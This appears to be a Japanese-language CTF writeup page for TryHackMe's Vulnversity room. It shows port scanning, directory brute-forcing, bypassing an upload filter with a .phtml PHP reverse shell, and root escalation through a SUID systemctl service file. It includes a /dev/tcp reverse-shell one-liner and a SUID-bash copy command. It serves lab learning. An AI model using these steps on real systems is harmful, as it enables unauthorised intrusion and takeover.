@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Vulnversity (班教育) Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Vulnversity (班教育)</h1>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+      <span class="badge">Series: 班教育</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+
+    <article class="writeup-body">
+      <p>nmapを実施する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/blue]
+      └─$ nmap 10.49.140.213
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 09:46 +0900
+      Nmap scan report for 10.49.140.213
+      Host is up (0.13s latency).
+      Not shown: 994 closed tcp ports (reset)
+      PORT     STATE SERVICE
+      21/tcp   open  ftp
+      22/tcp   open  ssh
+      139/tcp  open  netbios-ssn
+      445/tcp  open  microsoft-ds
+      3128/tcp open  squid-http
+      3333/tcp open  dec-notes
+
+      Nmap done: 1 IP address (1 host up) scanned in 3.51 seconds</code></pre>
+      <p>windowsマシンのようだ<br>
+      445ポートに脳死で<code>smbclient -L</code>を凪げてみる</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ smbclient -L //10.49.140.213 
+      Password for [WORKGROUP\kali]:
+
+              Sharename       Type      Comment
+              ---------       ----      -------
+              print$          Disk      Printer Drivers
+              IPC$            IPC       IPC Service (ip-10-49-140-213 server (Samba, Ubuntu))
+      Reconnecting with SMB1 for workgroup listing.
+      smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+      Protocol negotiation to server 10.49.140.213 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+      Unable to connect with SMB1 -- no workgroup available</code></pre>
+      <p>成果を得られず<br>
+      各ポートのバージョンを確認する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ nmap 10.49.140.213 -p 21,22,139,445,3128,3333 -sV -T4               
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 10:05 +0900
+      Nmap scan report for 10.49.140.213
+      Host is up (0.13s latency).
+
+      PORT     STATE SERVICE     VERSION
+      21/tcp   open  ftp         vsftpd 3.0.5
+      22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+      139/tcp  open  netbios-ssn Samba smbd 4
+      445/tcp  open  netbios-ssn Samba smbd 4
+      3128/tcp open  http-proxy  Squid http proxy 4.10
+      3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+      Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+      Nmap done: 1 IP address (1 host up) scanned in 24.07 seconds
+                                                                                                              
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ </code></pre>
+      <p>3333ポートがhttpであることが分かった<br>
+      経験則からこれはとっても怪しいのでアクセスしてみる</p>
+      <img src="images/squad/Pasted image 20260610101835.png" alt="スクリーンショット">
+      <p>webページにアクセスすることができた<br>
+      feroxをしかける</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ feroxbuster -u http://10.49.140.213:3333
+                                                                                                           
+       ___  ___  __   __     __      __         __   ___
+      |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+      |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+      by Ben "epi" Risher 🤓                 ver: 2.13.1
+      ───────────────────────────┬──────────────────────
+       🎯  Target Url            │ http://10.49.140.213:3333/
+       🚩  In-Scope Url          │ 10.49.140.213
+       🚀  Threads               │ 50
+       📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
+       👌  Status Codes          │ All Status Codes!
+       💥  Timeout (secs)        │ 7
+       🦡  User-Agent            │ feroxbuster/2.13.1
+       💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+       🔎  Extract Links         │ true
+       🏁  HTTP methods          │ [GET]
+       🔃  Recursion Depth       │ 4
+      ───────────────────────────┴──────────────────────
+       🏁  Press [ENTER] to use the Scan Management Menu™
+      ──────────────────────────────────────────────────
+      404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+      403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+      301      GET        9l       28w      322c http://10.49.140.213:3333/images =&gt; http://10.49.140.213:3333/images/
+      200      GET       72l      133w     1588c http://10.49.140.213:3333/css/jquery.timepicker.css
+      200      GET       43l       94w     1265c http://10.49.140.213:3333/css/flaticon.css
+      200      GET       62l      191w     1946c http://10.49.140.213:3333/js/google-map.js
+      200      GET        1l        6w     9467c http://10.49.140.213:3333/css/open-iconic-bootstrap.min.css
+      200      GET        2l       72w    12597c http://10.49.140.213:3333/js/jquery.stellar.min.js
+      200      GET        7l      285w    15764c http://10.49.140.213:3333/js/jquery.timepicker.min.js
+      200      GET        4l      212w    20216c http://10.49.140.213:3333/js/jquery.magnific-popup.min.js
+      200      GET        7l      570w    50676c http://10.49.140.213:3333/js/bootstrap.min.js
+      200      GET     3377l     7494w    73641c http://10.49.140.213:3333/css/animate.css
+      200      GET    10253l    40950w   268038c http://10.49.140.213:3333/js/jquery.min.js
+      301      GET        9l       28w      319c http://10.49.140.213:3333/css =&gt; http://10.49.140.213:3333/css/
+      301      GET        9l       28w      318c http://10.49.140.213:3333/js =&gt; http://10.49.140.213:3333/js/
+      200      GET       15l       51w      965c http://10.49.140.213:3333/css/owl.theme.default.min.css
+      200      GET        6l       73w     3440c http://10.49.140.213:3333/css/owl.carousel.min.css
+      200      GET      351l      795w     6950c http://10.49.140.213:3333/css/magnific-popup.css
+      200      GET       35l      179w     5340c http://10.49.140.213:3333/css/ajax-loader.gif
+      200      GET        8l       28w     1391c http://10.49.140.213:3333/js/jquery.animateNumber.min.js
+      200      GET      512l     1690w    17945c http://10.49.140.213:3333/css/bootstrap-datepicker.css
+      200      GET      272l      535w     4886c http://10.49.140.213:3333/css/bootstrap/bootstrap-reboot.css
+      200      GET       11l       46w    46816c http://10.49.140.213:3333/css/ionicons.min.css
+      200      GET     1671l     4509w    46820c http://10.49.140.213:3333/js/bootstrap-datepicker.js
+      200      GET     1708l     4570w    45805c http://10.49.140.213:3333/css/bootstrap/bootstrap-grid.css
+      200      GET     9397l    25506w   252996c http://10.49.140.213:3333/css/style.css
+      301      GET        9l       28w      324c http://10.49.140.213:3333/internal =&gt; http://10.49.140.213:3333/internal/
+      301      GET        9l       28w      321c http://10.49.140.213:3333/fonts =&gt; http://10.49.140.213:3333/fonts/
+      301      GET        9l       28w      332c http://10.49.140.213:3333/internal/uploads =&gt; http://10.49.140.213:3333/internal/uploads/
+      200      GET      205l     1368w     8111c http://10.49.140.213:3333/js/jquery.easing.1.3.js
+      200      GET      215l     1394w    11421c http://10.49.140.213:3333/js/jquery-migrate-3.0.1.min.js
+      200      GET       32l      239w     7447c http://10.49.140.213:3333/js/scrollax.min.js
+      200      GET        7l      152w     8835c http://10.49.140.213:3333/js/jquery.waypoints.min.js
+      200      GET      308l      631w     6769c http://10.49.140.213:3333/js/main.js
+      200      GET      652l     2357w    33014c http://10.49.140.213:3333/index.html
+      200      GET        2l      284w    14244c http://10.49.140.213:3333/js/aos.js
+      200      GET        2l      220w    25983c http://10.49.140.213:3333/css/aos.css
+      200      GET       12l     3898w   170032c http://10.49.140.213:3333/internal/css/bootstrap.min.css
+      200      GET       55l      324w    28756c http://10.49.140.213:3333/images/person_9.jpg
+      200      GET      221l     1450w    89759c http://10.49.140.213:3333/images/person_5.jpg
+      200      GET     4919l     8218w    79875c http://10.49.140.213:3333/css/icomoon.css
+      200      GET      278l     1407w   109682c http://10.49.140.213:3333/images/image_1.jpg
+      200      GET      315l     1727w   139498c http://10.49.140.213:3333/images/event-6.jpg
+      200      GET      358l     2304w   196870c http://10.49.140.213:3333/images/event-1.jpg
+      200      GET      418l     1701w   157952c http://10.49.140.213:3333/images/image_3.jpg
+      200      GET      389l     2229w   190422c http://10.49.140.213:3333/images/image_2.jpg
+      200      GET      292l     3064w   198556c http://10.49.140.213:3333/images/person_7.jpg
+      200      GET      719l     6717w   462562c http://10.49.140.213:3333/images/bg_4.jpg
+      200      GET       44l       98w      998c http://10.49.140.213:3333/js/range.js
+      200      GET     2520l    13107w  1051940c http://10.49.140.213:3333/images/bg_1.jpg
+      200      GET      652l     2357w    33014c http://10.49.140.213:3333/
+      200      GET        5l      347w    19032c http://10.49.140.213:3333/js/popper.min.js
+      200      GET      272l      530w     4868c http://10.49.140.213:3333/css/css/bootstrap-reboot.css
+      200      GET        7l      287w    43237c http://10.49.140.213:3333/js/owl.carousel.min.js
+      200      GET        4l     1298w    86658c http://10.49.140.213:3333/js/jquery-3.2.1.min.js
+      200      GET        7l     1604w   140421c http://10.49.140.213:3333/css/bootstrap.min.css
+      200      GET        0l        0w        0c http://10.49.140.213:3333/css/css/mixins/_text-hide.css
+      200      GET       59l      373w    27000c http://10.49.140.213:3333/fonts/open-iconic/open-iconic.woff
+      200      GET      201l      574w    39846c http://10.49.140.213:3333/fonts/open-iconic/open-iconic.otf
+      200      GET      543l     7786w    54789c http://10.49.140.213:3333/fonts/open-iconic/open-iconic.svg
+      200      GET        1l        1w      688c http://10.49.140.213:3333/fonts/flaticon/backup.txt
+      200      GET      179l     1705w    35867c http://10.49.140.213:3333/fonts/open-iconic/open-iconic.ttf
+      200      GET      179l     1710w    36039c http://10.49.140.213:3333/fonts/open-iconic/open-iconic.eot
+      200      GET       12l       71w     4429c http://10.49.140.213:3333/fonts/flaticon/font/Flaticon.woff
+      200      GET       23l      227w     4257c http://10.49.140.213:3333/fonts/flaticon/font/Flaticon.ttf
+      200      GET       35l       80w      970c http://10.49.140.213:3333/fonts/flaticon/font/flaticon.css
+      200      GET       47l       98w     1292c http://10.49.140.213:3333/fonts/flaticon/font/_flaticon.scss
+      200      GET       23l      231w     4445c http://10.49.140.213:3333/fonts/flaticon/font/Flaticon.eot
+      200      GET      475l     1097w    17728c http://10.49.140.213:3333/fonts/flaticon/font/flaticon.html
+      200      GET      111l     1796w    18821c http://10.49.140.213:3333/fonts/flaticon/font/Flaticon.svg
+      200      GET      262l     1450w   119996c http://10.49.140.213:3333/fonts/ionicons/fonts/ionicons.woff
+      200      GET      405l     2081w    60555c http://10.49.140.213:3333/fonts/flaticon/license/license.pdf
+      200      GET     2522l    10324w   355925c http://10.49.140.213:3333/fonts/icomoon/icomoon.ttf
+      200      GET     1480l     4487w    57268c http://10.49.140.213:3333/fonts/ionicons/css/_ionicons.scss
+      200      GET       11l       46w    51284c http://10.49.140.213:3333/fonts/ionicons/css/ionicons.min.css
+      200      GET      212l     1141w    91571c http://10.49.140.213:3333/fonts/ionicons/fonts/ionicons.woff2
+      200      GET     2522l    10325w   356098c http://10.49.140.213:3333/fonts/icomoon/icomoon.eot
+      200      GET     1250l     5103w   130464c http://10.49.140.213:3333/fonts/ionicons/fonts/ionicons.ttf
+      200      GET     1250l     5106w   130654c http://10.49.140.213:3333/fonts/ionicons/fonts/ionicons.eot
+      200      GET     2522l    10327w   356021c http://10.49.140.213:3333/fonts/icomoon/icomoon.woff
+      200      GET     2094l    61292w   313199c http://10.49.140.213:3333/fonts/ionicons/fonts/ionicons.svg
+      301      GET        9l       28w      328c http://10.49.140.213:3333/internal/css =&gt; http://10.49.140.213:3333/internal/css/
+      200      GET     1530l    71755w   935341c http://10.49.140.213:3333/fonts/icomoon/icomoon.svg
+      200      GET      180l      898w    62057c http://10.49.140.213:3333/images/person_3.jpg
+      200      GET      137l      843w    64169c http://10.49.140.213:3333/images/person_1.jpg
+      200      GET      121l      601w    44350c http://10.49.140.213:3333/images/person_4.jpg
+      200      GET      167l     1086w    83261c http://10.49.140.213:3333/images/person_2.jpg
+      200      GET        4l       55w     2865c http://10.49.140.213:3333/images/loc.png
+      200      GET      293l     1468w    92796c http://10.49.140.213:3333/images/course-6.jpg
+      200      GET      125l     1194w    98910c http://10.49.140.213:3333/images/event-4.jpg
+      200      GET      381l     1609w   131091c http://10.49.140.213:3333/images/course-4.jpg
+      200      GET      431l     1933w   151467c http://10.49.140.213:3333/images/course-2.jpg
+      200      GET      414l     2481w   190114c http://10.49.140.213:3333/images/image_4.jpg
+      200      GET      775l     4034w   319835c http://10.49.140.213:3333/images/image_5.jpg
+      200      GET      339l     1774w   169336c http://10.49.140.213:3333/images/course-1.jpg
+      200      GET      470l     2546w   215485c http://10.49.140.213:3333/images/course-3.jpg
+      200      GET      522l     3133w   261437c http://10.49.140.213:3333/images/image_6.jpg
+      200      GET      198l     1318w   110075c http://10.49.140.213:3333/images/course-5.jpg
+      200      GET     1043l     6412w   457605c http://10.49.140.213:3333/images/person_6.jpg
+      200      GET      366l     1947w   181827c http://10.49.140.213:3333/images/event-3.jpg
+      200      GET     1089l     5760w   510198c http://10.49.140.213:3333/images/bg_3.jpg
+      200      GET      730l     4012w   318152c http://10.49.140.213:3333/images/event-2.jpg
+      200      GET      553l     2819w   211209c http://10.49.140.213:3333/images/person_8.jpg
+      200      GET     1598l     9778w   799181c http://10.49.140.213:3333/images/bg_2.jpg
+      200      GET      698l     3936w   311367c http://10.49.140.213:3333/images/event-5.jpg
+      [####################] - 89s    60175/60175   0s      found:103     errors:11     
+      [####################] - 88s    30000/30000   339/s   http://10.49.140.213:3333/ 
+      [####################] - 13s    30000/30000   2287/s  http://10.49.140.213:3333/images/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 4s     30000/30000   8511/s  http://10.49.140.213:3333/css/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 3s     30000/30000   8813/s  http://10.49.140.213:3333/js/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 1s     30000/30000   55351/s http://10.49.140.213:3333/css/bootstrap/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 82s    30000/30000   365/s   http://10.49.140.213:3333/internal/ 
+      [####################] - 0s     30000/30000   111940/s http://10.49.140.213:3333/fonts/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 4s     30000/30000   7772/s  http://10.49.140.213:3333/fonts/icomoon/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 3s     30000/30000   10468/s http://10.49.140.213:3333/fonts/ionicons/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 3s     30000/30000   10010/s http://10.49.140.213:3333/fonts/open-iconic/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 3s     30000/30000   10352/s http://10.49.140.213:3333/fonts/flaticon/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 1s     30000/30000   42980/s http://10.49.140.213:3333/internal/css/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 7s     30000/30000   4203/s  http://10.49.140.213:3333/internal/uploads/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 0s     30000/30000   106007/s http://10.49.140.213:3333/css/css/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 0s     30000/30000   108303/s http://10.49.140.213:3333/css/css/mixins/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 1s     30000/30000   33860/s http://10.49.140.213:3333/fonts/ionicons/fonts/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 1s     30000/30000   54645/s http://10.49.140.213:3333/fonts/ionicons/css/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 0s     30000/30000   71090/s http://10.49.140.213:3333/fonts/flaticon/license/ =&gt; Directory listing (add --scan-dir-listings to scan)
+      [####################] - 0s     30000/30000   73171/s http://10.49.140.213:3333/fonts/flaticon/font/ =&gt; Directory listing (add --scan-dir-listings to scan) </code></pre>
+      <p><code>/internal</code>と<code>/internal/uploads</code>という怪しいディレクトリを発見した</p>
+      <img src="images/squad/Pasted image 20260610102347.png" alt="スクリーンショット">
+      <img src="images/squad/Pasted image 20260610102401.png" alt="スクリーンショット">
+      <p><code>/internal</code>はファイルをアップロードできるページ<br>
+      <code>/internal/uploads</code>はアップロードされたファイルを確認できるページ</p>
+      <p>すでに<code>shell.phtml</code>というファイルがアップロードされていることが分かる<br>
+      <code>.phtml</code>という拡張子はhtmlの中にPHPを埋め込んだWEBページにつけられる拡張子<br>
+      機能的にはphpと同じだが命名規則的に区別されることも多い</p>
+      <p>アップロードができるページではすべての拡張子が受け入れられるわけではないが<br>
+      <code>/uploads</code>に<code>.phtml</code>があるということは少なくともこの拡張子は受け入れられそう<br>
+      かつ、この拡張子は機能的にはphpと同等であることから<br>
+      phpのリバースシェルを作成して拡張子を変更すればアップロードが叶いそう</p>
+      <p>...と、進めてもよいが、せっかく一度解いたルームを解いているので<br>
+      今回はburpsuiteを使ってアップロードできる拡張子を特定する手順を踏みたいと思う</p>
+      <p>まずburpsuiteを起動する</p>
+      <img src="images/squad/Pasted image 20260610103427.png" alt="スクリーンショット">
+      <p><code>Open browser</code>からブラウザを開く<br>
+      アップロードページにアクセスする</p>
+      <img src="images/squad/Pasted image 20260610103554.png" alt="スクリーンショット">
+      <p>burpsuiteのHTTP historyではアクセスした形跡が確認できるようになる</p>
+      <p>いましたいことは「いくつかの拡張子を投げてどう反応されるか」を見ることである<br>
+      まず適当なファイルを投げてPOSTの型をburpsuiteに記録させる<br>
+      いったん適当なPythonファイルを投げてみた</p>
+      <img src="images/squad/Pasted image 20260610104325.png" alt="スクリーンショット">
+      <p>すると「拡張子が許可されていません」というエラーが表示された<br>
+      このことからも許可されている拡張子を投げられれば好きなことしていいんだということが分かる<br>
+      このPOSTをburpsuiteで確認する</p>
+      <img src="images/squad/Pasted image 20260610104541.png" alt="スクリーンショット">
+      <p>これをIntruderに投げる<br>
+      右クリックしてSend to Intruderしてやればよい</p>
+      <img src="images/squad/Pasted image 20260610104723.png" alt="スクリーンショット">
+      <p>Intruderタブに移動した<br>
+      先ほど投げたpythonファイル<code>51536.py</code>というファイル名が確認できる<br>
+      pythonコードも赤字コメントアウトで確認できる</p>
+      <p>Tryhackmeの案内にしたがってつぎのファイルを作成する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ vim phpext.txt  
+                                                                                                           
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ cat phpext.txt                                    
+      .php
+      .php3
+      .php4
+      .php4
+      .phtml
+                                                                                                           
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ </code></pre>
+      <blockquote><p>先頭に<code>.</code>をつけるとバグった<br>先頭から<code>.</code>を外すと通った<br>拡張子ブルートフォースはそのようにするとよいっぽい</p></blockquote>
+      <p>こっからはTryhackmeのページでも案内がないのでアドリブでやる<br>
+      たぶんこのAddを押すんじゃないか</p>
+      <img src="images/squad/Pasted image 20260610105002.png" alt="スクリーンショット">
+      <p>すると新しい画面が出た</p>
+      <img src="images/squad/Pasted image 20260610105118.png" alt="スクリーンショット">
+      <p>とりあえずpayload configurationからloadを押して先ほど作成した拡張子リストを選択してみた</p>
+      <img src="images/squad/Pasted image 20260610105229.png" alt="スクリーンショット">
+      <p>これは結局拡張子をブルートフォースさせたいみたいな気持ちなので<br>
+      表示されていたファイル名の拡張子の部分を選択してaddを押してみた</p>
+      <img src="images/squad/Pasted image 20260610105432.png" alt="スクリーンショット">
+      <p>すると<code>$$</code>で囲まれたのでなんかよさそう</p>
+      <img src="images/squad/Pasted image 20260610105518.png" alt="スクリーンショット">
+      <p>START ATTACKしてみる</p>
+      <img src="images/squad/Pasted image 20260610110237.png" alt="スクリーンショット">
+      <p>それぞれのリクエストを投げつけることができた<br>
+      Lengthを確認するとphtmlだけ他と異なるので「あたり」の可能性が高い</p>
+      <p>たとえば<code>.php</code>のレスポンスを見ると<br>
+      Extension not allowedが返ってきている</p>
+      <img src="images/squad/Pasted image 20260610110411.png" alt="スクリーンショット">
+      <p>つぎに<code>phtml</code>を確認すると<br>
+      Successと表示されているのでこれがあたりだ</p>
+      <img src="images/squad/Pasted image 20260610110512.png" alt="スクリーンショット">
+      <p>phpのリバースシェルをとってくる</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/basicpentestingjt]
+      └─$ locate php-reverse-shell  
+      /home/kali/claude-obsidian/wiki/techniques/《php-reverse-shell-upload》.md
+      /home/kali/xml-obsidian/wiki/techniques/《php-reverse-shell-upload》.xml
+      /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php
+      /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverse-shell.php
+      /usr/share/webshells/php/php-reverse-shell.php</code></pre>
+      <p><code>locate php-reverse-shell</code>でkaliに入っている場所が分かる</p>
+      <p>これを作業ディレクトリにコピーしてブラウザからアップロードする</p>
+      <img src="images/squad/Pasted image 20260610111353.png" alt="スクリーンショット">
+      <p><code>/internal/uploads</code>でファイルが確認できる</p>
+      <img src="images/squad/Pasted image 20260610111516.png" alt="スクリーンショット">
+      <p>クリックして実行する</p>
+      <p>うまくいかなかった</p>
+      <img src="images/squad/Pasted image 20260610112006.png" alt="スクリーンショット">
+      <p>コードの中身をみる</p>
+      <img src="images/squad/Pasted image 20260610112030.png" alt="スクリーンショット">
+      <p>ここを編集してからアップロードすべきだったかもしれない</p>
+      <p>新しいものを再アップロードする</p>
+      <img src="images/squad/Pasted image 20260610112317.png" alt="スクリーンショット">
+      <p>別ターミナルでリッスンポートを開いてからブラウザ上で実行するとシェルがきた</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/vulnversity]
+      └─$ rlwrap nc -nlvp 1234
+      listening on [any] 1234 ...
+      connect to [192.168.205.211] from (UNKNOWN) [10.49.140.213] 48710
+      Linux ip-10-49-140-213 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+       22:23:34 up  1:46,  0 users,  load average: 0.00, 0.00, 0.00
+      USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+      uid=33(www-data) gid=33(www-data) groups=33(www-data)
+      /bin/sh: 0: can't access tty; job control turned off
+      $ </code></pre>
+      <p>少し探索をして<code>user.txt</code>をゲットした</p>
+      <img src="images/squad/Pasted image 20260610112730.png" alt="スクリーンショット">
+      <p>つぎは権限昇格を考える<br>
+      パスワードがないので<code>sudo -l</code>が試せない</p>
+      <p>SUIDを探す</p>
+      <img src="images/squad/Pasted image 20260610113544.png" alt="スクリーンショット">
+      <p>どれが怪しいんですか？</p>
+      <p>たとえば<code>passwd</code>はパスワードを管理してて、変更とかができるコマンドだけど<br>
+      この変更手順で<code>/etc/shadow</code>を触る必要があって、この瞬間だけはrootとして働きたいので<br>
+      それを実現するためにSUIDが与えられている<br>
+      だからここに<code>passwd</code>が出てきているのは自然<br>
+      と、思える</p>
+      <p><code>systemctl</code>はどうだろう<br>
+      これも一般ユーザーが実行して一時的にroot権限を借りる設計になっている<br>
+      その点では<code>passwd</code>と同じと言える</p>
+      <p>が、<code>systemctl</code>にSUIDが付与されることはあってはならない<br>
+      理由は、<code>passwd</code>が「自分自身のパスワード変更」という閉じた操作で完結する一方で<br>
+      <code>systemctl</code>はシステム全体に影響を及ぼす操作を行うという違いがあるからだ<br>
+      そのため<code>systemctl</code>はSUIDではなく別アプローチによって一時的なroot権限が付与される設計になっている</p>
+      <p>これ、その場の思い巡らしで到達できる？それとも知識？</p>
+      <hr>
+      <p><code>systemctl</code>でサービスを起動するためにはまずサービスをlinkさせる必要がある</p>
+      <pre><code class="language-bash">systemctl link /home/user/aaaa.service</code></pre>
+      <p>この<code>link</code>はroot権限が必要な操作である<br>
+      <code>systemctl</code>にSUIDが付与されている場合、上記のコマンドがroot権限で実行されることになる<br>
+      それによって任意のコマンドがサービスとして登録できるようになり<br>
+      よくない</p>
+      <pre><code class="language-bash">systemctl link /home/hacker/evil.service</code></pre>
+      <p>ということで<code>systemctl</code>がSUIDにあってはいけない理由が理解できたのでGTFOBinsで探して実行する</p>
+      <img src="images/squad/Pasted image 20260610120229.png" alt="スクリーンショット">
+      <hr>
+      <p>GTFOBinsではつぎの結果が出た</p>
+      <img src="images/squad/Pasted image 20260610133055.png" alt="スクリーンショット">
+      <p>はじめ、これをまるごとコピペしてそのまま実行しようとしたので意味がわからないことになった</p>
+      <p>正しくやろうとするとまずこれが作りたいサービスの雛形である</p>
+      <pre><code class="language-bash">[Service]
+      Type=oneshot
+      ExecStart=/path/to/command
+      [Install]
+      WantedBy=multi-user.target</code></pre>
+      <p><code>/path/to/command</code>に好きなコマンドを入れる</p>
+      <p>上記を<code>echo ' ' &gt; /path/to/temp-file.service</code>しているのがGTFOBinsでヒットした結果の前半５行である<br>
+      そのあと</p>
+      <pre><code class="language-bash">systemctl link /path/to/temp-file.service</code></pre>
+      <p>および</p>
+      <pre><code class="language-bash">systemctl enable --now /path/to/temp-file.service</code></pre>
+      <p>を実施する流れである<br>
+      <code>/path/to/temp-file.service</code>にはsystemctlに登録したいサービスの場所を入れる<br>
+      今回であれば<code>/tmp/aaa.service</code>である</p>
+      <p>つぎに<code>/path/to/command</code>になにをいれるかを考える<br>
+      <code>/bin/sh</code>を入れた場合<br>
+      	systemctlにはSUIDが付与されているのでroot権限で<code>/bash/sh</code>が立ち上がる<br>
+      	しかしstdin/stdoutが接続されていないため即座に接続終了する<br>
+      	<code>aaa.service</code>の中に記述されている<code>Type=oneshot</code>はプロセスの終了をもってサービス完了を判定するため、<code>/bin/sh</code>が即座に接続し、即座に終了し、サービス正常完了。<br>
+      	結果、なにも成果を得られない。<br>
+      SUIDバイナリを作成する場合<br>
+      	任意コマンドに<code>/bin/bash -c "cp /bin/bash /tmp/aaa_bash &amp;&amp; chmod +s /tmp/aaa_bash"</code>を入れるアイデア<br>
+      	root権限で<code>/bin/bash -c</code>が起動し、任意コマンドが実行される<br>
+      	めっちゃあたまいい<br>
+      リバースシェルを飛ばす場合<br>
+      	もっとも一般的<br>
+      	<code>/bin/bash -c "bash -i &gt;&amp; /dev/tcp/&lt;攻撃側IP&gt;/&lt;PORT&gt; 0&gt;&amp;1"</code>を入れる</p>
+      <p><code>/tmp/aaaaa_bash</code>を作成する方法で実施した<br>
+      bashやdashやzshはSUID権限をセキュリティ上の仕様で放棄してしまうため<code>-p</code>で放棄しないでくださいと指示する必要がある</p>
+      <img src="images/squad/Pasted image 20260610135421.png" alt="スクリーンショット">
+      <p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>班教育 WriteUp &mdash; <a href="https://github.com/53b29461/thm-writeups">GitHub</a></p>
+  </footer>
+</body>
+</html>
